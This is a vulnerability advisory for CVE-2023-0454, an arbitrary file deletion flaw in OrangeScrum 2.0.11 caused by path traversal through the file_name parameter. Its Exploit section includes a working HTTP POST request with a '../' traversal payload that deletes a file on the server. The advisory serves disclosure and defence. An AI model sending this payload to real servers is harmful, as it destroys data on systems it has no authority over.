---
slug: advisories/slushii/
title: OrangeScrum 2.0.11 - Arbitrary File Delete via file_name
authors: Carlos Bello
writer: cbello
codename: slushii
product: OrangeScrum 2.0.11
date: 2023-01-30 12:00 COT
cveid: CVE-2023-0454
severity: 8.1
description: OrangeScrum 2.0.11 - Arbitrary File Delete via file_name
keywords: Fluid Attacks, Security, Vulnerabilities, Orangescrum, Arbitrary File Delete
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                          |
| --------------------- | -------------------------------------------------------- |
| **Name**              | OrangeScrum 2.0.11 - Arbitrary File Delete via file_name |
| **Code name**         | [Slushii](https://en.wikipedia.org/wiki/Slushii)         |
| **Product**           | OrangeScrum                                              |
| **Affected versions** | 2.0.11                                                   |
| **State**             | Public                                                   |
| **Release Date**      | 2023-01-30                                               |

## Vulnerability

|                       |                                                                                                            |
| --------------------- | -----------------------------------------------------------------------------------------------------------|
| **Kind**              | Lack of data validation - Path Traversal                                                                   |
| **Rule**              | [063. Lack of data validation - Path Traversal](https://docs.fluidattacks.com/criteria/vulnerabilities/063)|
| **Remote**            | Yes                                                                                                        |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H                                                               |
| **CVSSv3 Base Score** | 8.1                                                                                                        |
| **Exploit available** | No                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0454](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0454)                              |

## Description

OrangeScrum version 2.0.11 allows an authenticated external attacker to
delete arbitrary local files from the server. This is possible because
the application uses an unsanitized attacker-controlled parameter to
construct an internal path.

## Vulnerability

This vulnerability occurs because the application uses an unsanitized
attacker-controlled parameter to construct an internal path.

## Exploit

To exploit this vulnerability, we only need to send the following
malicious malicious request to the server.

```txt
POST /projects/delete_file HTTP/1.1
Host: retr02332bughunter.orangescrum.com
Cookie: USER_UNIQ=1515f12e8e8fc20b7a103011dee82b89; USERTYP=2; USERTZ=49; USERSUB_TYPE=0;
User-Agent: Retr02332
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 96
Connection: close

file_name=../../../../../../../../../../../../../var/www/html/orangescrum/app/webroot/hacked.txt
```

## Evidence of exploitation

![vulnerability-code](https://user-images.githubusercontent.com/51862990/214197500-6dc5e3cc-3628-49a7-88c4-b451be1649eb.png)

![before-delete](https://user-images.githubusercontent.com/51862990/214197541-d13f3117-5445-4cea-8b65-9d681ce4b26a.png)

![delete-file-proxy](https://user-images.githubusercontent.com/51862990/214197697-52b886ee-3649-436f-ad70-d4f19a348144.png)

![after-delete](https://user-images.githubusercontent.com/51862990/214197448-5f946fa1-01cf-432d-9bdc-b9fc449e7248.png)

## Our security policy

We have reserved the ID CVE-2023-0454 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OrangeScrum 2.0.11

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Orangescrum/orangescrum/>

## Timeline

<time-lapse
  discovered="2023-01-23"
  contacted="2023-01-23"
  replied="2023-01-23"
  confirmed=""
  patched=""
  disclosure="2023-01-30">
</time-lapse>
